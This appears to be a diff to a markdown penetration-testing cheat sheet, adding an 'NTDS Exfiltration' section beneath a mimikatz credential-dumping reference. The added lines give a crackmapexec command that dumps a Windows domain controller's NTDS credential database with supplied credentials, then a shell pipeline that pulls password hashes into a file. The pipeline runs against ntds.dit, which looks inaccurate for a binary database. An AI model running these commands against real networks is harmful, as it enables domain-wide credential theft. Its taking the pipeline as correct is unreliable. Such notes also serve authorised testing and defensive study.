@@ -64,7 +64,17 @@ sekurlsa::logonPasswords
 
 ### NTDS Exfiltration
 
-TODO
+Dump NTDS :
+
+```markdown
+crackmapexec smb IP -u "USERNAME" -p "PASSWORD" -d "DOMAIN" --ntds
+```
+
+Extract hashes from NTDS :
+
+```markdown
+cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
+```
 
 ### PowerShell one-liners
 
